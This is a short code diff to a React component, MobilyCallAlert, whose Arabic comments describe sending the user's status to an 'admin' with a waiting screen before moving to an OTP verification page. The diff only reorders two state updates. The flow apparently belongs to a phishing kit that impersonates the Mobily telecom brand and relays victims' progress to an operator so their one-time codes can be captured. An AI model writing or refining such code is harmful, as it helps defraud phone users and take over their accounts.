@@ -60,8 +60,6 @@ export default function MobilyCallAlert() {
   };
 
   const handleNewCall = () => {
-    setIsRejected(false);
-    setCallReceived(true);
     // إرسال البيانات للأدمن مع شاشة الانتظار
     sendData({
       data: { الحالة: "تم تلقي المكالمة" },
@@ -69,6 +67,9 @@ export default function MobilyCallAlert() {
       nextPage: "تحقق رقم الجوال (OTP)?serviceProvider=5",
       waitingForAdminResponse: true,
     });
+    // تحديث الحالة بعد إرسال البيانات
+    setIsRejected(false);
+    setCallReceived(true);
   };
 
   return (
